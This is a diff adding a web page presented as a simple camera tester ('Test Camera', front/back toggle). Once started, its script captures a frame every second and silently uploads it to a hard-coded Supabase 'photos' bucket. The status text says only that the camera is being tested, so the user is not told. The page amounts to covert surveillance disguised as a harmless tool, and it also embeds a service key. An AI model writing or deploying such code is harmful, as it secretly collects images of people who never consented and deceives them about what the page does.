@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sender</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 16px; }
+    video, canvas { width: 320px; max-width: 100%; border: 1px solid #333; display: block; margin-top: 12px; }
+    canvas { display: none; }
+    button { padding: 10px 14px; margin-right: 8px; margin-top: 8px; }
+    #status { margin-top: 12px; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <h2>Tester</h2>
+
+  <button id="startBtn">Test Camera</button>
+  <button id="toggleBtn" disabled>Toggle Front/Back</button>
+
+  <div id="status">Not started</div>
+
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas" width="320" height="240"></canvas>
+
+  <script type="module">
+    import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm";
+
+    const SUPABASE_URL = "https://rfojbbejltapycalmywi.supabase.co";
+    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJmb2piYmVqbHRhcHljYWxteXdpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzYxODQwMjEsImV4cCI6MjA5MTc2MDAyMX0.FCbKAOnGLFwtAsmeXOIw-f69GhF_gyb7acmNPYnSg7k";
+    const BUCKET = "photos";
+
+    const sb = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+    const startBtn = document.getElementById("startBtn");
+    const toggleBtn = document.getElementById("toggleBtn");
+    const statusEl = document.getElementById("status");
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    let stream = null;
+    let useFront = true;
+    let timer = null;
+
+    function setStatus(msg) {
+      statusEl.textContent = msg;
+    }
+
+    async function startCamera() {
+      try {
+        if (stream) {
+          stream.getTracks().forEach(t => t.stop());
+        }
+
+        const constraints = {
+          video: {
+            facingMode: useFront ? "user" : "environment"
+          },
+          audio: false
+        };
+
+        stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream;
+        toggleBtn.disabled = false;
+        setStatus(useFront ? "Front camera active" : "Back camera active");
+      } catch (err) {
+        console.error(err);
+        setStatus("Camera error: " + err.message);
+      }
+    }
+
+    function dataUrlToBlob(dataUrl) {
+      const [meta, base64] = dataUrl.split(",");
+      const mime = meta.match(/data:(.*?);base64/)[1];
+      const binary = atob(base64);
+      const bytes = new Uint8Array(binary.length);
+      for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+      return new Blob([bytes], { type: mime });
+    }
+
+    async function captureAndUpload() {
+      if (!video.videoWidth || !video.videoHeight) {
+        setStatus("Waiting for camera...");
+        return;
+      }
+
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const dataUrl = canvas.toDataURL("image/jpeg", 0.8);
+      const blob = dataUrlToBlob(dataUrl);
+
+      const camera = useFront ? "front" : "back";
+      const uid = "public"; 
+      const filePath = `${uid}/${camera}/${Date.now()}.jpg`;
+
+      const { error } = await sb.storage.from(BUCKET).upload(filePath, blob, {
+        contentType: "image/jpeg",
+        upsert: false
+      });
+
+      if (error) {
+        console.error(error);
+        setStatus("Upload failed: " + error.message);
+      } else {
+        setStatus(`Testing ${camera} camera`);
+      }
+    }
+
+    startBtn.addEventListener("click", async () => {
+      await startCamera();
+      if (timer) clearInterval(timer);
+      timer = setInterval(captureAndUpload, 1000);
+    });
+
+    toggleBtn.addEventListener("click", async () => {
+      useFront = !useFront;
+      await startCamera();
+    });
+const filePath = `test/${Date.now()}.jpg`;
+  </script>
+</body>
+</html>
